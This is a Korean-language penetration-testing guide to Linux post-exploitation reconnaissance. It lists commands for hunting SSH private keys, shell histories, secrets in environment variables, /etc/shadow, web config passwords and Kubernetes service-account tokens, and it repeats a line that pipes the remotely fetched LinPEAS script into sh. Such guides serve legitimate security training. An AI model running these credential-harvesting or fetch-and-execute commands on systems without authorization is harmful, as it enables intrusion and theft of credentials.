---
sidebar_position: 1
title: Linux Information Gathering
---

# Linux 정보 수집 (Post-Exploitation)

## 개요

침투 후 권한 상승을 위한 시스템 정보 수집

**목표**:
- 권한 상승 가능성 탐색
- 횡적 이동 기회 확인
- 민감 정보 발견

---

## 호스트 정보

### 기본 시스템 정보

```bash
# 호스트명
hostname

# OS 버전
cat /etc/os-release
cat /etc/issue
cat /etc/lsb-release

# 커널 버전
uname -a
uname -r

# CPU 정보
cat /proc/cpuinfo | grep "model name" | head -1

# 메모리 정보
free -h
cat /proc/meminfo

# 디스크 정보
df -h

# 아키텍처
arch
lscpu
```

---

## 사용자 정보

### 현재 사용자

```bash
# 현재 사용자
whoami
id

# 사용자 상세 정보
id -u  # UID
id -g  # GID
groups  # 그룹 목록
```

### Sudo 권한 확인

```bash
# Sudo 권한 (가장 중요!)
sudo -l

# 예시 출력:
# User low may run the following commands on hostname:
#     (ALL) NOPASSWD: /usr/bin/vim
#     (root) /usr/bin/python
```

### 시스템 사용자 정보

```bash
# 모든 사용자
cat /etc/passwd

# 쉘이 있는 사용자만
cat /etc/passwd | grep -v "nologin"
cat /etc/passwd | grep "/bin/bash"

# 모든 그룹
cat /etc/group

# 특정 그룹 멤버
getent group sudo
getent group docker
getent group adm
getent group wheel

# 사용자 그룹 확인
groups <username>

# 현재 로그인 사용자
w
who
last
```

---

## 네트워크 정보

### IP 및 인터페이스

```bash
# IP 주소
ifconfig
ip addr show
ip a

# 네트워크 인터페이스
ip link show
```

### 연결 및 포트

```bash
# ARP 테이블 (같은 네트워크 호스트)
arp -a
ip neigh

# 라우팅 테이블
route -n
ip route

# 열린 포트 (리스닝)
ss -ltnp
netstat -tulpn
netstat -tulpn | grep LISTEN

# 모든 연결
ss -antp
netstat -ano

# 특정 포트 확인
ss -ltnp | grep :22
netstat -tulpn | grep :3306
```

### DNS 및 호스트

```bash
# DNS 설정
cat /etc/resolv.conf

# 호스트 파일
cat /etc/hosts

# 방화벽 규칙
iptables -L -n -v
ufw status
```

---

## 프로세스 정보

### 실행 중인 프로세스

```bash
# 모든 프로세스 (트리 구조)
ps faux
ps auxf

# root 프로세스
ps aux | grep root

# 특정 사용자 프로세스
ps aux | grep <username>

# 포트와 연결된 프로세스
ss -tulpn
netstat -tulpn
```

### 서비스 관리

```bash
# 실행 중인 서비스
systemctl --type=service --state=running
systemctl list-units --type=service

# 모든 서비스 상태
service --status-all

# 특정 서비스 확인
systemctl status <service>
```

---

## 파일 시스템

### 설정 파일

```bash
# 모든 .conf 파일
find /etc -name "*.conf" 2>/dev/null

# 특정 설정 파일
cat /etc/ssh/sshd_config
cat /etc/apache2/apache2.conf
cat /etc/nginx/nginx.conf
cat /etc/mysql/my.cnf

# 로그 파일
find /var/log -name "*.log" 2>/dev/null
ls -la /var/log/

# 웹 루트
ls -la /var/www/html
ls -la /var/www/
```

### Cron Jobs

```bash
# 시스템 Cron
cat /etc/crontab
ls -la /etc/cron.*
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# 사용자 Cron
crontab -l
crontab -l -u <username>

# 모든 사용자 Cron
for user in $(cat /etc/passwd | cut -f1 -d:); do echo $user; crontab -u $user -l 2>/dev/null; done
```

### 권한 문제 파일

```bash
# World-writable 파일
find / -type f -perm -002 2>/dev/null
find / -type f -perm 0777 2>/dev/null

# World-writable 디렉토리
find / -type d -perm -002 2>/dev/null

# SUID 파일 (매우 중요!)
find / -type f -perm -4000 2>/dev/null

# SGID 파일
find / -type f -perm -2000 2>/dev/null

# SUID + SGID
find / -type f -perm -6000 2>/dev/null

# 소유자가 없는 파일
find / -nouser 2>/dev/null

# 그룹이 없는 파일
find / -nogroup 2>/dev/null

# 최근 수정된 파일 (7일 이내)
find / -type f -mtime -7 2>/dev/null

# 최근 수정된 파일 (1일 이내)
find / -type f -mtime -1 2>/dev/null
```

---

## 민감한 파일

### SSH 키

```bash
# SSH 개인키
find / -name "id_rsa*" 2>/dev/null
find / -name "id_dsa*" 2>/dev/null
find / -name "id_ecdsa*" 2>/dev/null
find / -name "id_ed25519*" 2>/dev/null

# 현재 사용자 SSH
ls -la ~/.ssh/
cat ~/.ssh/id_rsa
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/authorized_keys

# 모든 사용자 SSH
find /home -name "id_rsa*" 2>/dev/null
```

### 히스토리 파일

```bash
# Bash 히스토리
cat ~/.bash_history
cat /home/*/.bash_history
cat /root/.bash_history 2>/dev/null

# MySQL 히스토리
cat ~/.mysql_history
cat /root/.mysql_history 2>/dev/null

# Python 히스토리
cat ~/.python_history
```

### 환경 변수

```bash
# 환경 변수 (비밀 정보 확인)
env
export

# 비밀번호 관련
env | grep -i pass
env | grep -i pwd
env | grep -i key
env | grep -i secret
env | grep -i token
```

### 백업 파일

```bash
# 백업 파일
find / -name "*.bak" 2>/dev/null
find / -name "*.backup" 2>/dev/null
find / -name "*~" 2>/dev/null
find / -name "*.old" 2>/dev/null

# 압축 파일
find / -name "*.tar.gz" 2>/dev/null
find / -name "*.zip" 2>/dev/null
```

### 비밀번호 파일

```bash
# 비밀번호 해시
cat /etc/shadow 2>/dev/null

# 설정 파일에서 비밀번호 검색
grep -r "password" /etc 2>/dev/null
grep -r "passwd" /etc 2>/dev/null
grep -r "pwd" /var/www 2>/dev/null

# 데이터베이스 설정
cat /var/www/html/wp-config.php 2>/dev/null
cat /var/www/html/config.php 2>/dev/null
find / -name "config.php" 2>/dev/null
```

---

## 소프트웨어 & 패키지

### 설치된 소프트웨어

```bash
# Debian/Ubuntu
dpkg -l
dpkg -l | grep -i <package>

# RedHat/CentOS
rpm -qa
rpm -qa | grep -i <package>

# Arch Linux
pacman -Q

# 수동 설치 소프트웨어
ls -la /opt
ls -la /usr/local

# 실행 가능 바이너리
which gcc python python3 perl php nc netcat wget curl nmap
```

### 개발 도구

```bash
# 컴파일러
which gcc g++ make

# 스크립트 언어
which python python3 perl ruby php node

# 네트워크 도구
which nc netcat nmap socat wget curl telnet ftp ssh
```

---

## 컨테이너 환경 확인

### Docker 컨테이너

```bash
# Docker 컨테이너 확인
ls -la /.dockerenv
cat /proc/self/cgroup | grep docker

# Docker 소켓 확인
ls -la /var/run/docker.sock

# Docker 그룹 멤버십
groups | grep docker
```

### Kubernetes Pod

```bash
# Kubernetes Pod 확인
cat /proc/self/cgroup | grep kubepods
ls -la /var/run/secrets/kubernetes.io/

# Service Account Token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
```

---

## 자동화 도구

### LinPEAS (추천)

```bash
# 다운로드 및 실행
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# 또는 저장 후 실행
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# 특정 기능만 실행
./linpeas.sh -a  # 모든 검사
./linpeas.sh -s  # 슈퍼 빠른 검사
```

### LinEnum

```bash
# 다운로드
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

# 실행
chmod +x LinEnum.sh
./LinEnum.sh

# 상세 출력
./LinEnum.sh -t
```

### Linux Smart Enumeration (lse.sh)

```bash
# 다운로드
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh

# 실행
chmod +x lse.sh
./lse.sh

# 레벨 지정 (0-2, 높을수록 상세)
./lse.sh -l 1
./lse.sh -l 2
```

---

## 정보 수집 워크플로우

### 빠른 체크리스트

```bash
# 1. 현재 사용자 및 권한
whoami && id
sudo -l

# 2. 시스템 정보
hostname && uname -a
cat /etc/os-release

# 3. 네트워크
ifconfig || ip addr
ss -ltnp || netstat -tulpn

# 4. SUID 파일 (권한 상승)
find / -perm -4000 2>/dev/null

# 5. Cron Jobs
cat /etc/crontab
ls -la /etc/cron.*

# 6. SSH 키
find / -name "id_rsa*" 2>/dev/null

# 7. 환경 변수
env | grep -i pass

# 8. 자동화 도구
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

---

## 주요 명령어 요약

```bash
# 시스템 정보
hostname && whoami && id
uname -a && cat /etc/os-release

# 사용자 & 권한
sudo -l
cat /etc/passwd
cat /etc/group

# 네트워크
ifconfig && ip addr
ss -ltnp && netstat -tulpn
arp -a

# SUID/SGID
find / -perm -4000 2>/dev/null
find / -perm -2000 2>/dev/null

# SSH 키
find / -name "id_rsa*" 2>/dev/null
ls -la ~/.ssh/

# 환경 변수
env | grep -i pass
env | grep -i key

# Cron Jobs
cat /etc/crontab
ls -la /etc/cron.*

# 자동화 도구
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

## 실무 팁

1. ✅ **sudo -l 최우선** - 가장 빠른 권한 상승 경로
2. ✅ **SUID 파일** - GTFOBins 활용
3. ✅ **SSH 키 확인** - 다른 시스템 접근 가능
4. ✅ **Cron Jobs** - 주기적 실행 악용
5. ✅ **환경 변수** - 비밀번호/토큰 노출
6. ✅ **자동화 도구 활용** - LinPEAS 우선

## 다음 단계

정보 수집 후:
- **SUID 파일** → [Linux Privilege Escalation - SUID](/penetration/post-exploitation/linux-privesc-suid)
- **Sudo 권한** → [Linux Privilege Escalation - Sudo](/penetration/post-exploitation/linux-privesc-sudo)
